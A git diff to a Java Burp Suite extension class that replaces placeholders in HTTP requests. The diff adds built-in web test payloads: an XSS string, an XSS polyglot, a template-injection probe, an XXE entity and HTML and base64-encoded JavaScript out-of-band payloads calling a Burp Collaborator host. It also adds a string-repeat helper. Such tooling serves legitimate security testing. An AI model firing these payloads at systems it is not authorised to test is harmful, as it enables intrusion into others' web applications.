@@ -1,19 +1,17 @@
 package burp_magicvars.util;
 
 import burp.api.montoya.collaborator.Collaborator;
-import burp.api.montoya.http.message.params.HttpParameterType;
 import burp_magicvars.MagicVariable;
 import burp_magicvars.enums.MagicVariableType;
 import burp_magicvars.event.MagicVarsReplacementEvent;
 
+import java.nio.charset.StandardCharsets;
 import java.time.Instant;
-import java.util.ArrayList;
+import java.util.*;
 import javax.swing.event.SwingPropertyChangeSupport;
 import java.beans.PropertyChangeListener;
-import java.util.Arrays;
-import java.util.Random;
-import java.util.UUID;
 import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class MagicVarsReplacer {
     private Collaborator collaborator;
@@ -127,6 +125,32 @@ public class MagicVarsReplacer {
         return String.format("%d", System.currentTimeMillis() / 1000L);
     }
 
+    public String getXSS() {
+        return String.format("'\"><img/src/onerror=alert(%s)>", getRint());
+    }
+
+    public String getXSSPG() {
+        return "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(" + getRint() + "))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert("+ getRint()+ ")//>\\x3e";
+    }
+
+    public String getSSTI() {
+        return "{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}*{7*7}@(7*7)";
+    }
+
+    public String getXXE() {
+        return "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://" + collaborator.defaultPayloadGenerator().generatePayload().toString() + "\" >]><foo>&xxe;</foo>";
+    }
+
+    public String getHTMLOOB() {
+        return String.format("'\"><img src=\"https://%s\">", collaborator.defaultPayloadGenerator().generatePayload().toString());
+    }
+
+    public String getJSOOB() {
+        String basePayload = String.format("var x = new XMLHttpRequest();x.open(\"GET\", \"https://%s\");x.send();", collaborator.defaultPayloadGenerator().generatePayload().toString());
+        String payloadB64 = Base64.getEncoder().encodeToString(basePayload.getBytes(StandardCharsets.UTF_8));
+        return String.format("'\"><img/src/onerror=eval(atob('%s'))>", payloadB64);
+    }
+
     private String prepareVariableName( String variableName ) {
         return String.format("%s%s%s", getLeftVariableMarker(),variableName,getRightVariableMarker());
     }
@@ -216,9 +240,23 @@ public class MagicVarsReplacer {
                     }
                 }
             }
+            // Process regex based builtin
+
+            // REPEATSTR
+
+            Pattern repeatStrPattern = Pattern.compile(String.format(".*%sREPEATSTR__(\\w+)__(\\d+)%s",getLeftVariableMarker(),getRightVariableMarker()));
+            Matcher repeatStrMatcher = repeatStrPattern.matcher(param);
+            if ( repeatStrMatcher.find() && repeatStrMatcher.groupCount() == 2) {
+                String repeatStr = repeatStrMatcher.group(1);
+                int repeatCount = Integer.parseInt(repeatStrMatcher.group(2));
+                // Refuse to make a string longer than 100mb
+                if (repeatCount <= 100000000) {
+                    param = repeatStrPattern.matcher(param).replaceAll(repeatStr.repeat(repeatCount));
+                    emit(MagicVarsReplacementEvent.REPLACEMENT_MADE, null, "REPEATSTR_CHR_COUNT");
+                }
+            }
 
             // Process builtin
-
             param = emitIfChanged(prepareVariableName("RINT"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("RINT")), parameterEncoder.encodeParameter(getRint())));
             param = emitIfChanged(prepareVariableName("FNAME"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("FNAME")), parameterEncoder.encodeParameter(getFName())));
             param = emitIfChanged(prepareVariableName("LNAME"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("LNAME")), parameterEncoder.encodeParameter(getLName())));
@@ -233,7 +271,15 @@ public class MagicVarsReplacer {
             param = emitIfChanged(prepareVariableName("NEUUID"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("NEUUID")), parameterEncoder.encodeParameter(getNeUUID())));
             param = emitIfChanged(prepareVariableName("NEUUID"), param, param.replaceAll("(?i)(?i)[a-f0-9]{8}-[a-f0-9]{2}de-adbe-ef[a-f0-9]{2}-[a-f0-9]{12}", parameterEncoder.encodeParameter(getNeUUID())));
             param = emitIfChanged(prepareVariableName("TIMESTAMP"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("TIMESTAMP")), parameterEncoder.encodeParameter(getUnixTimestamp())));
+            param = emitIfChanged(prepareVariableName("XSS"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("XSS")), parameterEncoder.encodeParameter(getXSS())));
+            param = emitIfChanged(prepareVariableName("XSSPG"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("XSSPG")), parameterEncoder.encodeParameter(getXSSPG())));
+            param = emitIfChanged(prepareVariableName("SSTI"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("SSTI")), parameterEncoder.encodeParameter(getSSTI())));
+
+
             if ( collaborator != null ) {
+                param = emitIfChanged(prepareVariableName("JSOOB"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("JSOOB")), parameterEncoder.encodeParameter(getJSOOB())));
+                param = emitIfChanged(prepareVariableName("HTMLOOB"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("HTMLOOB")), parameterEncoder.encodeParameter(getHTMLOOB())));
+                param = emitIfChanged(prepareVariableName("XXE"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("XXE")), parameterEncoder.encodeParameter(getXXE())));
                 param = emitIfChanged(prepareVariableName("OOB"), param, param.replaceAll("(?i)%s".formatted(prepareVariableName("OOB")), parameterEncoder.encodeParameter(collaborator.defaultPayloadGenerator().generatePayload().toString())));
             }
         }
